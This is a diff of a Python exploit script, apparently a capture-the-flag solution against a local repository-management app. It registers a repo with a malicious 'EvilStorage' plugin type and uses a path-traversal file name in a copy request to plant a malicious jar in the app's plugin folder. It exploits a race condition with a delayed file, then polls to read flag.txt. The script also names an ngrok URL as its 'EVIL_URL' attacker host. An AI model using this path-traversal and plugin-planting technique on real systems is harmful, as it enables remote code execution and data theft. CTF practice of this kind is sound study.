@@ -5,7 +5,7 @@ import string
 import threading
 
 BASE_URL = "http://127.0.0.1:1337"
-EVIL_URL = "https://d92b-24-176-103-131.ngrok-free.app"
+EVIL_URL = "https://b703-24-176-103-131.ngrok-free.app"
 
 def async_post(url, json_data):
     try:
@@ -27,29 +27,28 @@ R = requests.post(BASE_URL+"/api/repos/add",json={"name":repo_name,"type":"HTTPS
 # Get the current time
 T = int(time.time())
 
-# App doesn't check if a plugin exists when creating the repo so we can pre-make repos to target the next 10 seconds
-repos = [rand_repo() for x in range(10)]
+# App doesn't check if a plugin exists when creating the repo so we can pre-set a repo
+repo_name_2 = rand_repo()
 
-print("[+] Pre-adding malicious repos")
-for i,r in enumerate(repos):
-    R = requests.post(BASE_URL+"/api/repos/add",json={"name":r,"type":"../../../../tmp/repocopy_%d/EvilStorage" % (T+i),"config":{"path":""}})
+print("[+] Pre-adding malicious repo")
+R = requests.post(BASE_URL+"/api/repos/add",json={"name":repo_name_2,"type":"EvilStorage","config":{}})
 
 # Create race condition by pulling malicious jar pugin and then delaying the second file for a few seconds so the first doesn't get checked
 print("[+] Requesting file copy")
 thread = threading.Thread(
     target=async_post,
-    args=(BASE_URL+"/api/repos/copy",{"source":repo_name,"target":"default","files":["EvilStorage.jar","delayme"]})
+    args=(BASE_URL+"/api/repos/copy",{"source":repo_name,"target":"default","files":["../../../app/plugins/storage/EvilStorage.jar","delayme"]})
 )
 thread.start()
 
 # Wait for the first jar to be downloaded
 while True:
-    for r in repos:
-        R = requests.get(BASE_URL+"/api/repos/view/%s" % r)
-        # This repo exists and we can grab the flag
-        print(R.text)
-        if "Plugin JAR not found" not in R.text:
-            print("[+] Repo exists! Requesting flag")
-            R = requests.get(BASE_URL+"/api/repos/file/%s/flag.txt" % r)
-            print("Response: %s" % R.text)
-            exit()
+    R = requests.get(BASE_URL+"/api/repos/view/%s" % repo_name_2)
+    # This repo exists and we can grab the flag
+    if "Plugin JAR not found" not in R.text:
+        print("[+] Repo exists! Requesting flag")
+        R = requests.get(BASE_URL+"/api/repos/file/%s/flag.txt" % repo_name_2)
+        J = R.json()
+        print("Response: %s" % J["data"]["content"])
+        exit()
+    time.sleep(0.5)
